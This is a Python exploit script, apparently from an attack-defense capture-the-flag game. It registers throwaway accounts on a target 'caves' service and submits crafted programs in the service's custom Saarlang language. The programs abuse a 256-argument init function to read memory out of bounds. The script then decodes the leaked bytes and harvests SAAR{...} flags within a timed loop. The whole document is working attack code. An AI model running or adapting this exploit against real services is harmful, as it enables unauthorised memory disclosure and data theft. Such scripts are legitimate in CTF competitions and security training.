#!/usr/bin/env python3
import random
import logging
import re
import requests
import struct
import uuid
import sys
import time

deadline = time.time() + 55
logging.basicConfig(level=logging.INFO)
logging.info('argv = %s', sys.argv)

host = sys.argv[1]
port = '9080'
hh = host.split(':')
if len(hh) == 2:
    host, port = hh
url = f'http://{host}:{port}'
session = requests.Session()

r = session.post(f'{url}/api/users/register', json={'username': str(uuid.uuid4()), 'password': str(uuid.uuid4())})
r.raise_for_status()

if len(sys.argv) >= 3 and sys.argv[2] != '':
    cave_id = sys.argv[2]
else:
    r = session.get(f'{url}/api/caves/list')
    r.raise_for_status()
    caves = sorted(r.json(), key=lambda x: int(x['created']))
    cave = caves[-1]
    cave_id = cave['id']
    logging.info('cave = %s', cave)

source0 = '''
holmol "stdlib.sl";

eijo main() gebbtserick byte: {}

eijo __saarlang_init_('''
for arg_index in range(256):
    source0 += f'arg{arg_index}: lischd int'
    if arg_index != 255:
        source0 += ', '
source0 += ''') gebbtserick byte: {
'''

flags = set()
arg_indices = list(range(256))
random.shuffle(arg_indices)
arg_index_it = iter(arg_indices)
actual_crash_indices = list()
while time.time() < deadline:
    try:
        arg_index = next(arg_index_it)
    except StopIteration:
        arg_index_it = iter(arg_indices)
        arg_index = next(arg_index_it)
    logging.info('arg%d remaining=%.2f', arg_index, deadline - time.time())
    source = source0
    source += f'''  var len: int = grees(arg{arg_index});
  falls len > 8192: {{ len = 8192; }}
  var i: int = 0;
  solang i < len: {{
    mach sahmol_ln(arg{arg_index}@i);
    i = i + 1;
  }}
}}
'''
    print(source)
    r = session.post(f'{url}/api/visit', json={'cave_id': cave_id, 'files': {'foo.sl': source}})
    cur = bytearray()
    vals = r.content.decode().split()
    if len(vals) == 0:
        logging.info('crash/2 ' + str(r.status_code) + ' ' + r.content.decode())
        actual_crash_indices.append(arg_index)
    else:
        logging.info('#vals: %d', len(vals))
        for val in vals:
            try:
                val = int(val)
            except ValueError:
                break
            if val < 0:
                val += 0x10000000000000000
            cur.extend(struct.pack('<Q', int(val)))
        for m in re.findall(b'SAAR{.+?}', cur):
            try:
                flag = m.decode()
            except UnicodeDecodeError:
                continue
            if flag not in flags:
                print(flag)
                flags.add(flag)
logging.info('actual_crash_indices = %s', actual_crash_indices)
